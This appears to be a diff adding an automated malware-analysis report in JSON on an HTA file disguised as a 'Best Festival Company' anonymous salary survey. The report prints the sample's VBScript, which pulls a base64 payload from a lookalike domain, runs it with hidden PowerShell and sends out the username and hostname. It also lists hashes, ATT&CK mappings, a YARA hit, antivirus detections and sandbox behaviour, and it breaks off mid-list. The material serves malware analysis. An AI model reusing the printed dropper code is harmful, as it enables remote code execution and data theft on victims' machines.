@@ -1,0 +1,1498 @@
+{
+  "schema_version": "4.0",
+  "tool": "MAL",
+  "tool_version": "4.0",
+  "generated_at": "2026-10-26T04:59:39+00:00",
+  "mode": "file",
+  "sample": {
+    "name": "survey-1761116087028.hta",
+    "path": "C:\\Users\\DELL\\Videos\\files\\MAL_v4\\MAL_v4\\survey-1761116087028.hta",
+    "type": "HTML Application (HTA)",
+    "kind": "script",
+    "size": 8011,
+    "created": "2026-10-26T10:28:07",
+    "modified": "2026-08-25T14:01:41",
+    "md5": "2493116413135ac6c13b670955d1e46a",
+    "sha1": "752275a6a9b5b874111be0f5144603b9fd22b071",
+    "sha256": "984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408",
+    "sha3_256": "e685cf8ac2d3d244b899da7483d7b5c0a4e9712b34af345b9b3be9852c9a1264",
+    "ssdeep": "192:GSwQcESM4N6J1T06FFoSwL9AR8CdjkHSmX7JjkH+:pwQcESM4N6J1TTFF828CCqe",
+    "tlsh": "T194F1E77BA64E491CD60B10B057BA4BC56D1DE13753006ED1FC7EA93CA8ECA41533EB68",
+    "entropy": 5.619032,
+    "entropy_map": [
+      4.623,
+      4.782,
+      4.13,
+      4.405,
+      4.735,
+      4.769,
+      4.643,
+      4.84,
+      4.514,
+      4.593,
+      4.718,
+      4.495,
+      4.613,
+      4.616,
+      4.48,
+      4.727,
+      4.701,
+      4.316,
+      4.319,
+      4.473,
+      4.493,
+      4.698,
+      4.828,
+      4.725,
+      4.556,
+      4.452,
+      4.759,
+      4.678,
+      4.807,
+      4.357,
+      4.792,
+      4.789,
+      4.68,
+      4.441,
+      4.574,
+      4.195,
+      4.566,
+      4.158,
+      4.329,
+      4.239,
+      4.171,
+      4.104,
+      4.479,
+      4.757,
+      4.454,
+      4.135,
+      4.636,
+      4.227,
+      4.491,
+      4.199,
+      4.342,
+      4.409,
+      4.637,
+      4.265,
+      4.024,
+      4.118,
+      3.974,
+      4.522,
+      4.669,
+      4.506,
+      4.475,
+      4.688,
+      4.426,
+      4.711,
+      4.605,
+      4.44,
+      4.603,
+      4.745,
+      4.592,
+      4.57,
+      4.633,
+      4.659,
+      4.369,
+      4.978,
+      4.897,
+      5.327,
+      2.033,
+      4.694,
+      5.027,
+      4.475,
+      5.125,
+      4.414,
+      5.164,
+      4.758,
+      5.357,
+      4.714,
+      4.883,
+      4.864,
+      4.902,
+      4.296,
+      4.688,
+      4.098,
+      4.53,
+      4.446,
+      5.0,
+      4.836
+    ]
+  },
+  "strings": [
+    "<!DOCTYPE html>",
+    "<html>",
+    "<head>",
+    "<title>Best Festival Company Developer Survey</title>",
+    "<hta:application id=\"APP123080\"",
+    "applicationname=\"Festival Elf Survey\"",
+    "icon=\"logo.ico\"",
+    "border=\"thin\"",
+    "caption=\"yes\"",
+    "maximizebutton=\"no\"",
+    "minimizebutton=\"no\"",
+    "singleinstance=\"yes\"",
+    "windowstate=\"normal\"",
+    "sysmenu=\"yes\">",
+    "</hta:application>",
+    "<script type=\"text/javascript\">",
+    "function visited() {",
+    "document.getElementById(\"never\").style.display = 'none';",
+    "document.getElementById(\"visited\").style.display = 'block';",
+    "function never() {",
+    "document.getElementById(\"visited\").style.display = 'none';",
+    "document.getElementById(\"never\").style.display = 'block';",
+    "function submitted() {",
+    "document.getElementById(\"spinner\").style.display = 'none';",
+    "document.getElementById(\"questions\").style.display = 'none';",
+    "document.getElementById(\"thanks\").style.display = 'block';",
+    "function submit() {",
+    "document.getElementById(\"submitbutton\").style.display = 'none';",
+    "document.getElementById(\"spinner\").style.display = 'inline';",
+    "setTimeout(submitted, 2000);",
+    "</script>",
+    "<script type=\"text/vbscript\">",
+    "Sub Window_onLoad",
+    "Call getQuestions()",
+    "End Sub",
+    "Function getQuestions()",
+    "Dim IE, result, decoded, decodedString",
+    "Set IE = CreateObject(\"InternetExplorer.Application\")",
+    "IE.navigate2 \"http://survey.bestfestiivalcompany.com/survey_questions.txt\"",
+    "Do While IE.ReadyState < 4",
+    "result = IE.document.body.innerText",
+    "IE.quit ",
+    "decoded = decodeBase64(result)",
+    "decodedString = RSBinaryToString(decoded)",
+    "        Call provideFeedback(decodedString)",
+    "End Function",
+    "Function provideFeedback(feedbackString)",
+    "Dim strHost, strUser, strDomain",
+    "On Error Resume Next",
+    "strHost = CreateObject(\"WScript.Network\").ComputerName",
+    "strUser = CreateObject(\"WScript.Network\").UserName",
+    "Dim IE",
+    "IE.navigate2 \"http://survey.bestfestiivalcompany.com/details?u=\" & strUser & \"?h=\" & strHost",
+    "IE.quit",
+    "Dim runObject",
+    "Set runObject = CreateObject(\"Wscript.Shell\")",
+    "runObject.Run \"powershell.exe -nop -w hidden -c \" & feedbackString, 0, False",
+    "Function decodeBase64(base64)",
+    "dim DM, EL",
+    "Set DM = CreateObject(\"Microsoft.XMLDOM\")",
+    "Set EL = DM.createElement(\"tmp\")",
+    "EL.DataType = \"bin.base64\"",
+    "EL.Text = base64",
+    "decodeBase64 = EL.NodeTypedValue",
+    "end function",
+    "Function RSBinaryToString(xBinary)",
+    "Dim Binary",
+    "If vartype(xBinary)=8 Then Binary = MultiByteToBinary(xBinary) Else Binary = xBinary",
+    "Dim RS, LBinary",
+    "Const adLongVarChar = 201",
+    "Set RS = CreateObject(\"ADODB.Recordset\")",
+    "LBinary = LenB(Binary)",
+    "If LBinary>0 Then",
+    "RS.Fields.Append \"mBinary\", adLongVarChar, LBinary",
+    "RS.Open",
+    "RS.AddNew",
+    "RS(\"mBinary\").AppendChunk Binary ",
+    "RS.Update",
+    "RSBinaryToString = RS(\"mBinary\")",
+    "RSBinaryToString = \"\"",
+    "End If",
+    "<style>",
+    "body {",
+    "font-family: museo_sans,Arial,Helvetica,sans-serif;",
+    "overflow-x: hidden;               ",
+    "#header {",
+    "background-color: rgb(0, 153, 153);",
+    "box-shadow: rgba(0, 0, 0, .298039) 0 5px 0 0;",
+    "height: 150px;",
+    "width: 100%;",
+    "z-index: 1000;",
+    "margin-right: auto; ",
+    "margin-left: auto;",
+    "#survey-content {",
+    "max-width: 1100px;",
+    "margin-right: auto;",
+    "#topbar {",
+    "max-width: 500px;",
+    "float: left;",
+    "#logo {",
+    "margin-left 10%;",
+    "#survey {",
+    "margin-top: 5.0%;",
+    "margin-right: 20px;",
+    "padding-left: 10px;",
+    "padding-right: 10px;",
+    "font-family: inherit;",
+    "font-size: 40px;",
+    "text-color: #F8F8F8;",
+    "font-weight: bold;",
+    "text-transform: uppercase;",
+    "text-decoration: none;",
+    "color: #FFFFFF;",
+    "float: right;",
+    "#survey-heading {",
+    "color: #FFFFFF; ",
+    "font-family: 'Helvetica Neue', sans-serif; ",
+    "letter-spacing: -1px;",
+    "line-height: 1; ",
+    "#hp  {",
+    "float: right;    ",
+    "margin: -55% 65%;",
+    "#thanks {",
+    "overflow-x: hidden;",
+    "overflow-y: hidden;",
+    "</style>",
+    "</head>",
+    "<body>",
+    "<div id=\"header\">",
+    "<div id=\"topbar\">",
+    "<img id=\"logo\" src=\"logo.png\" alt=\"logo\"></img>",
+    "</div>",
+    "<div id=\"survey\">",
+    "<p id=\"survey-heading\">Insert Survey Heading</p>",
+    "</div><br>",
+    "<div id=\"survey-content\">",
+    "<h2>Anonymous Salary Feedback</h2>",
+    "<div id=\"questions\">",
+    "<div>",
+    "<p> We are looking for your feedback to help us improve our employee relations and to invest in the future of our employees.This survey is completely anonymous and gives you to opportunity to express what you think about Best Festival Company's commitment to its employees. Please take five minutes to complete the following survey.</p>",
+    "<h3>How long have you been employed at Best Festival Company?</h3>",
+    "<label><input type=\"radio\" name=\"q1\"/> Less than 1 year</label><br />",
+    "<label><input type=\"radio\" name=\"q1\"/> Less than 2 years</label><br />",
+    "<label><input type=\"radio\" name=\"q1\"/> 2 years or more</label>",
+    "<h3>Do you feel valued at work?</h3>",
+    "<label><input type=\"radio\" name=\"q2\" />Yes</label><br />",
+    "<label><input type=\"radio\" name=\"q2\" />No</label><br />",
+    "<label><input type=\"radio\" name=\"q2\" />Indecisive</label>",
+    "<h3>Do you feel content with your current salary?</h3>",
+    "<label><input type=\"radio\" name=\"q3\" />Yes</label><br />",
+    "<label><input type=\"radio\" name=\"q3\" />No</label><br />",
+    "<label><input type=\"radio\" name=\"q3\" />Indecisive</label>",
+    "<h3>By how much do you believe your salary should increase?</h3>",
+    "<label><input type=\"radio\" name=\"q4\" />Up to 5%</label><br />",
+    "<label><input type=\"radio\" name=\"q4\" />Between 5% and 10%</label><br />",
+    "<label><input type=\"radio\" name=\"q4\" />Between 10% and 15%</label><br />",
+    "<label><input type=\"radio\" name=\"q4\" />More that 10%</label><br />",
+    "<input id=\"submitbutton\" type=\"submit\" value=\"Submit\" style=\"background-color:rgb(0, 153, 153);border:none;border-radius:3px 3px 3px 3px;color:#FFFFFF;padding: 3px 20px;margin-top:25px; font-weight: bold\" onMouseOver=\"this.style.backgroundColor='#ff9900'\" onMouseOut=\"this.style.backgroundColor='#009999'\" onclick=\"submit()\" />",
+    "<img src=\"data:image/gif;base64,R0lGODlhEAAQAPQAAP///3d3d/r6+pSUlL29vXp6eouLi+jo6NDQ0IKCgrW1ta2trfDw8MfHx+Dg4J2dnaSkpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAAFUCAgjmRpnqUwFGwhKoRgqq2YFMaRGjWA8AbZiIBbjQQ8AmmFUJEQhQGJhaKOrCksgEla+KIkYvC6SJKQOISoNSYdeIk1ayA8ExTyeR3F749CACH5BAkKAAAALAAAAAAQABAAAAVoICCKR9KMaCoaxeCoqEAkRX3AwMHWxQIIjJSAZWgUEgzBwCBAEQpMwIDwY1FHgwJCtOW2UDWYIDyqNVVkUbYr6CK+o2eUMKgWrqKhj0FrEM8jQQALPFA3MAc8CQSAMA5ZBjgqDQmHIyEAIfkECQoAAAAsAAAAABAAEAAABWAgII4j85Ao2hRIKgrEUBQJLaSHMe8zgQo6Q8sxS7RIhILhBkgumCTZsXkACBC+0cwF2GoLLoFXREDcDlkAojBICRaFLDCOQtQKjmsQSubtDFU/NXcDBHwkaw1cKQ8MiyEAIfkECQoAAAAsAAAAABAAEAAABVIgII5kaZ6AIJQCMRTFQKiDQx4GrBfGa4uCnAEhQuRgPwCBtwK+kCNFgjh6QlFYgGO7baJ2CxIioSDpwqNggWCGDVVGphly3BkOpXDrKfNm/4AhACH5BAkKAAAALAAAAAAQABAAAAVgICCOZGmeqEAMRTEQwskYbV0Yx7kYSIzQhtgoBxCKBDQCIOcoLBimRiFhSABYU5gIgW01pLUBYkRItAYAqrlhYiwKjiWAcDMWY8QjsCf4DewiBzQ2N1AmKlgvgCiMjSQhACH5BAkKAAAALAAAAAAQABAAAAVfICCOZGmeqEgUxUAIpkA0AMKyxkEiSZEIsJqhYAg+boUFSTAkiBiNHks3sg1ILAfBiS10gyqCg0UaFBCkwy3RYKiIYMAC+RAxiQgYsJdAjw5DN2gILzEEZgVcKYuMJiEAOwAAAAAAAAAAAA==\" style=\"display:none\" id=\"spinner\" />",
+    "<div id=\"thanks\" style=\"display:none\">",
+    "<div>Thank you for your feedback!</div>",
+    "<div>All participants will be entered into a prize draw for a chance to win a trip to the South Pole!</div>",
+    "<input id=\"submitbutton\" type=\"submit\" value=\"Close\" style=\"background-color:rgb(0, 153, 153);border:none;border-radius:3px 3px 3px 3px;color:#FFFFFF;padding: 3px 20px;margin-top:25px; font-weight: bold\" onMouseOver=\"this.style.backgroundColor='#ff9900'\" onMouseOut=\"this.style.backgroundColor='#009999'\" onclick=\"self.close()\" />",
+    "</body>",
+    "</html>"
+  ],
+  "string_count": 165,
+  "iocs": {
+    "urls": [
+      "http://survey.bestfestiivalcompany.com/survey_questions.txt",
+      "http://survey.bestfestiivalcompany.com/details?u="
+    ],
+    "domains": [
+      "survey.bestfestiivalcompany.com"
+    ],
+    "ips": [],
+    "emails": [],
+    "file_paths": [],
+    "registry": [],
+    "mutexes": [],
+    "pipes": [],
+    "pdb_paths": [],
+    "crypto": [],
+    "hashes": [],
+    "_suppressed_benign": []
+  },
+  "ioc_origin": {
+    "urls|http://survey.bestfestiivalcompany.com/survey_questions.txt": "static",
+    "urls|http://survey.bestfestiivalcompany.com/details?u=": "static",
+    "domains|survey.bestfestiivalcompany.com": "static"
+  },
+  "capabilities": [
+    {
+      "id": "ps_exec",
+      "title": "PowerShell reference",
+      "category": "execution",
+      "weight": 6,
+      "attack": [
+        "T1059.001",
+        "Command and Scripting Interpreter: PowerShell",
+        "Execution"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "powershell.exe"
+    },
+    {
+      "id": "ps_hidden",
+      "title": "Hidden window execution",
+      "category": "evasion",
+      "weight": 7,
+      "attack": [
+        "T1564.003",
+        "Hide Artifacts: Hidden Window",
+        "Defense Evasion"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "-w hidden"
+    },
+    {
+      "id": "ps_bypass",
+      "title": "PowerShell policy bypass / no-profile",
+      "category": "execution",
+      "weight": 5,
+      "attack": [
+        "T1059.001",
+        "Command and Scripting Interpreter: PowerShell",
+        "Execution"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "-nop"
+    },
+    {
+      "id": "wsh",
+      "title": "Windows Script Host",
+      "category": "execution",
+      "weight": 7,
+      "attack": [
+        "T1059.005",
+        "Command and Scripting Interpreter: Visual Basic",
+        "Execution"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "Wscript.Shell"
+    },
+    {
+      "id": "createobject",
+      "title": "COM object creation",
+      "category": "execution",
+      "weight": 4,
+      "attack": [
+        "T1059.005",
+        "Command and Scripting Interpreter: Visual Basic",
+        "Execution"
+      ],
+      "count": 6,
+      "sources": [
+        "strings"
+      ],
+      "example": "CreateObject("
+    },
+    {
+      "id": "hta_content",
+      "title": "HTA / script-host content",
+      "category": "execution",
+      "weight": 5,
+      "attack": [
+        "T1218.005",
+        "System Binary Proxy Execution: Mshta",
+        "Defense Evasion"
+      ],
+      "count": 1,
+      "sources": [
+        "strings"
+      ],
+      "example": "<hta:application"
+    }
+  ],
+  "combos": [],
+  "findings": [],
+  "pe": null,
+  "elf": null,
+  "office": null,
+  "pdf": null,
+  "archive": null,
+  "deobfuscation": {
+    "layers": [
+      {
+        "method": "base64",
+        "depth": 0,
+        "encoded_len": 1132,
+        "decoded_len": 847,
+        "kind": "binary",
+        "sha256": "65b72e15d975f67fbd1cb126d57772c06c21fa016e5651b6ce213b26ce0e6877",
+        "entropy": 6.718,
+        "preview": "47 49 46 38 39 61 10 00 10 00 f4 00 00 ff ff ff 77 77 77 fa fa fa 94 94 94 bd bd bd 7a 7a 7a 8b 8b 8b e8 e8 e8 d0 d0 d0 82 82 82 b5 b5 b5 ad ad"
+      }
+    ],
+    "carved_pe": [],
+    "embedded_pe": [],
+    "xor": {
+      "hits": [],
+      "pe": [],
+      "truncated": false
+    }
+  },
+  "yara": {
+    "enabled": true,
+    "matches": [
+      {
+        "rule": "MAL_HTA_Shell_Launcher",
+        "namespace": "r0_mal_default",
+        "tags": [],
+        "description": "HTA application that creates a shell object",
+        "strings": [
+          "$h @ 0x54",
+          "$s @ 0x4b5"
+        ]
+      }
+    ],
+    "error": null,
+    "rules_loaded": 1
+  },
+  "intel": {
+    "enabled": true,
+    "requested": [
+      "vt",
+      "mb",
+      "urlhaus",
+      "threatfox",
+      "otx",
+      "ha",
+      "abuseipdb"
+    ],
+    "providers": {
+      "vt": {
+        "provider": "vt",
+        "label": "VirusTotal",
+        "status": "ok",
+        "sha256": "984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408",
+        "malicious": 6,
+        "suspicious": 0,
+        "harmless": 0,
+        "undetected": 54,
+        "timeout": 0,
+        "unsupported": 14,
+        "total_engines": 60,
+        "detection_ratio": 10.0,
+        "reputation": 0,
+        "votes": {
+          "harmless": 0,
+          "malicious": 0
+        },
+        "meaningful_name": "survey-1761116087028.hta",
+        "names": [
+          "survey-1761116087028.hta",
+          "survey-1761116087028.hta.malz",
+          "survey-1761116087028 (1).hta",
+          "survey-analisis de malwer (1).hta",
+          "survey-1761116087028 (2).hta",
+          "Unconfirmed 791685.crdownload",
+          "Unconfirmed 380984.crdownload",
+          "survey-1761116087028(1).hta",
+          "Malware.hta",
+          "survey.hta",
+          "Unconfirmed 428126.crdownload",
+          "delete.hta"
+        ],
+        "type_description": "HTML",
+        "type_tag": "html",
+        "size": 8011,
+        "tags": [
+          "detect-debug-environment",
+          "contains-embedded-js",
+          "base64-embedded",
+          "html"
+        ],
+        "capabilities": [],
+        "first_submission": "2025-12-21 16:04:37 UTC",
+        "last_submission": "2026-10-25 20:22:25 UTC",
+        "last_analysis": "2026-06-01 13:13:35 UTC",
+        "creation_date": null,
+        "times_submitted": 164,
+        "unique_sources": 135,
+        "threat_label": "trojan.alien/badshell",
+        "threat_categories": [
+          {
+            "value": "trojan",
+            "count": 2
+          },
+          {
+            "value": "pua",
+            "count": 1
+          },
+          {
+            "value": "virus",
+            "count": 1
+          }
+        ],
+        "threat_families": [
+          {
+            "value": "alien",
+            "count": 1
+          },
+          {
+            "value": "badshell",
+            "count": 1
+          }
+        ],
+        "flagged_engines": [
+          {
+            "engine": "Avast",
+            "category": "malicious",
+            "result": "Script:SNH-gen [Trj]",
+            "method": "blacklist"
+          },
+          {
+            "engine": "AVG",
+            "category": "malicious",
+            "result": "Script:SNH-gen [Trj]",
+            "method": "blacklist"
+          },
+          {
+            "engine": "Avira",
+            "category": "malicious",
+            "result": "TR/SNH",
+            "method": "blacklist"
+          },
+          {
+            "engine": "F-Secure",
+            "category": "malicious",
+            "result": "Trojan.TR/SNH",
+            "method": "blacklist"
+          },
+          {
+            "engine": "Kaspersky",
+            "category": "malicious",
+            "result": "not-a-virus:HEUR:RiskTool.HTA.Alien.gen",
+            "method": "blacklist"
+          },
+          {
+            "engine": "Xcitium",
+            "category": "malicious",
+            "result": "TrojWare.Win32.BadShell.XSP@7pmj0k",
+            "method": "blacklist"
+          }
+        ],
+        "sandbox_verdicts": [
+          {
+            "sandbox": "Zenbox",
+            "category": "harmless",
+            "confidence": 99,
+            "classification": [
+              "CLEAN"
+            ],
+            "names": []
+          }
+        ],
+        "crowdsourced_yara": [],
+        "sigma": [
+          {
+            "title": "Internet Explorer DisableFirstRunCustomize Enabled",
+            "level": "medium",
+            "source": "Sigma Integrated Rule Set (GitHub)"
+          }
+        ],
+        "sigma_stats": {
+          "critical": 0,
+          "high": 0,
+          "medium": 1,
+          "low": 0
+        },
+        "ids": [],
+        "signature": {},
+        "code_insight": [],
+        "hashes": {
+          "md5": "2493116413135ac6c13b670955d1e46a",
+          "sha1": "752275a6a9b5b874111be0f5144603b9fd22b071",
+          "sha256": "984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408",
+          "ssdeep": "192:GSwQcESM4N6J1T06FFoSwL9AR8CdjkHSmX7JjkH+:pwQcESM4N6J1TTFF828CCqe",
+          "tlsh": "T194F1E77BA64E491CD60B10B057BA4BC56D1DE13753006ED1FC7EA93CA8ECA41533EB68",
+          "vhash": "71ad5a2517f2393db99f87d6c4f1f44d",
+          "authentihash": null,
+          "imphash": null
+        },
+        "trid": [
+          "HyperText Markup Language (100.0%)"
+        ],
+        "packers": [],
+        "permalink": "https://www.virustotal.com/gui/file/984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408",
+        "from_cache": false,
+        "depth": "standard",
+        "calls_note": "~5 API calls",
+        "behaviour": {
+          "status": "ok",
+          "processes_created": [
+            "\"C:\\Windows\\system32\\mshta.exe\" \"C:\\Users\\<USER>\\Desktop\\survey-1761116087028.hta\"",
+            "C:\\Windows\\SysWOW64\\mshta.exe mshta.exe \"C:\\Users\\user\\Desktop\\survey-1761116087028.hta\"",
+            "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -Embedding",
+            "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe \"C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE\" SCODEF:3568 CREDAT:17410 /prefetch:2",
+            "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe \"C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE\" SCODEF:3568 CREDAT:3879960 /prefetch:2",
+            "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe \"C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE\" SCODEF:3568 CREDAT:3879962 /prefetch:2"
+          ],
+          "command_executions": [],
+          "files_written": [
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D",
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\E2C6CBAF0AF08CF203BA74BF0D0AB6D5_CBDCCBFE4F7A916411C1E69BDD97BB04",
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D",
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\E2C6CBAF0AF08CF203BA74BF0D0AB6D5_CBDCCBFE4F7A916411C1E69BDD97BB04",
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\Internet Explorer\\Services\\",
+            "C:\\Users\\user\\AppData\\LocalLow\\Microsoft\\Internet Explorer\\Services\\search_{0633EE93-D776-472f-A0FF-E1416B8B2E3A}.ico",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\RecoveryStore.{44F506D1-DE87-11F0-83D9-8065834F2B03}.dat",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\{44F506D3-DE87-11F0-83D9-8065834F2B03}.dat",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Tiles",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Tiles\\pin-314712940\\",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Tiles\\pin-314712940\\msapplication.xml",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Tiles\\pin-314712950\\",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\imagestore\\e8b0ck5",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\History",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\IECompatCache",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\IECompatUaCache",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\DNTException"
+          ],
+          "files_dropped": [
+            "warning[1]",
+            "error[1]",
+            "error[1]",
+            "MSIMGSIZ.DAT",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Tiles\\pin-314712940\\msapplication.xml",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\31XNEQHO\\errorPageStrings[1]",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\31XNEQHO\\error[1]",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\9FCIL3MD\\httpErrorPagesScripts[1]",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\D0HY4HOD\\dnserror[1]",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\MCXUJQJD\\NewErrorPageTemplate[1]",
+            "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\MCXUJQJD\\error[1]"
+          ],
+          "files_deleted": [],
+          "registry_keys_set": [
+            "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows Script\\Settings\\Telemetry\\mshta.exe = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script\\Settings\\Telemetry\\mshta.exe\\VBScriptSetScriptStateStarted = D0 A9 6F 00 00 00 00 00 ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TabbedBrowsing = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\VersionManager = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Protected - It is a violation of Windows Policy to modify. See aka.ms/browserpolicy = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\WindowsSearch = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ext\\Stats = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ext\\Settings = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Ext\\Settings\\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C} = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\MAO Settings = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\User Preferences = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes = ",
+            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\DownloadManager = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A} = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\MINIE = ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\OperationalData = 0D 00 00 00 00 00 00 00 ",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TabbedBrowsing\\NTPMigrationVer = 1",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation\\CVListXMLVersionLow = 395196024",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation\\CVListXMLVersionHigh = 268435456",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\GPU\\VendorId = 32902",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\GPU\\DeviceId = 32069",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation\\StaleCompatCache = 1",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\VersionManager\\FirstCheckForUpdateLowDateTime = -945027670",
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\VersionManager\\FirstCheckForUpdateHighDateTime = 31224499"
+          ],
+          "registry_keys_deleted": [],
+          "mutexes_created": [
+            "Local\\MSIMGSIZECacheMutex",
+            "\\Sessions\\1\\BaseNamedObjects\\Local\\MSIMGSIZECacheMutex",
+            "!PrivacIE!SharedMem!Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\Local\\!BrowserEmulation!SharedMemory!Mutex",
+            "!IECompat!Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\Local\\VERMGMTBlockListFileMutex",
+            "\\Sessions\\1\\BaseNamedObjects\\SmartScreen_AppRepSettings_Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\SmartScreen_ClientId_Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\CommunicationManager_Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\IsoScope_df0_IE_EarlyTabStart_0xe34_Mutex",
+            "\\Sessions\\1\\BaseNamedObjects\\{5312EE61-79E3-4A24-BFE1-132B85B23C3A}",
+            "\\Sessions\\1\\BaseNamedObjects\\{66D0969A-1E86-44CF-B4EC-3806DDDA3B5D}",
+            "\\Sessions\\1\\BaseNamedObjects\\Local\\TraceLogStorageMutex",
+            "\\Sessions\\1\\BaseNamedObjects\\UpdatingNewTabPageData",
+            "\\Sessions\\1\\BaseNamedObjects\\_!SHMSFTHISTORY!_",
+            "\\Sessions\\1\\BaseNamedObjects\\Local\\InternetShortcutMutex"
+          ],
+          "services_started": [],
+          "modules_loaded": [],
+          "dns_lookups": [
+            "survey.bestfestiivalcompany.com -> ",
+            "edgecdn-embza6g8cacagcbn.z01.azurefd.net -> 13.107.213.70, 13.107.246.70",
+            "bg.microsoft.map.fastly.net -> 199.232.214.172, 199.232.210.172",
+            "windows.msn.com-ion.edgesuite.net -> ",
+            "a1672.dscr.akamai.net -> 23.195.81.73, 23.195.81.59",
+            "nexusrules.officeapps.live.com -> 52.111.229.43, 52.111.227.11",
